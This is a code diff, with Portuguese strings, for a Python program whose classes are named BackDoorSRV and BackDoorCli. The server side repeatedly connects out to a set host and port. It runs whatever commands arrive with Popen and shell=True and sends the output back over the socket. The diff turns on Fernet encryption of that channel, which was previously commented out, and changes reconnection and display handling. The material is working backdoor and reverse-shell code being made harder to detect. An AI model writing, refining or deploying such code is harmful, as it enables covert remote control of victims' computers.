@@ -30,9 +30,8 @@ class BackDoorSRV:
                 print(f"TENTANDO CONECTAR({contagem})", end='\r')
                 contagem += 1
                 self.conexao.connect((self.host, self.port))
-                contagem = 0
-                self.receberConexao()
-            except Exception as erro: self.conexao.close()
+                self.receberConexao()                
+            except Exception as erro: self.fecharConexao(self.conexao, erro)
 
     def receberConexao(self):
         self.send(self.conexao, f"VOCÊ ESTA CONECTADO!\n")
@@ -61,7 +60,7 @@ class BackDoorSRV:
 
     def cmds(self, cmd, cliente):
         cmds = Popen(cmd.replace('\n', ''), shell=True, stdout=PIPE, stdin=PIPE).stdout.read()
-        self.conexao.sendall(cmds)
+        self.conexao.send(cmds)
 
     def print(self, msg, log=True):
         if(log): self.gravarLog(msg.replace('\n', ''))
@@ -73,16 +72,12 @@ class BackDoorSRV:
         self.objEncryptor = Fernet(objKey)
 
     def send(self, con, msg):
-        #con.send(self.objEncryptor.encrypt(msg.encode('UTF-8')))
-        con.send(msg.encode('UTF-8'))
+        con.send(self.objEncryptor.encrypt(msg.encode('UTF-8')))
 
     def recv(self, con):
-        return con.recv(self.buffer)
-        """
         msg = con.recv(self.buffer)
         try: return self.objEncryptor.decrypt(msg).decode()
         except: return msg
-        """
 
     def gravarLog(self, msg):
         with open('log.log', 'a') as arq: arq.write(f'{datetime.now()} ---- ' + msg + '\n')
@@ -107,6 +102,7 @@ class BackDoorCli(BackDoorSRV):
                 while True:
                     try:
                         print(self.recv(con))
+                        print('\n')
                         cmd = input("DIGITE O COMANDO DO DOS E PRESSIONE [ENTER]>:")
                         self.send(con, cmd)
                     except  Exception as erro: self.fecharConexao(con, erro);break
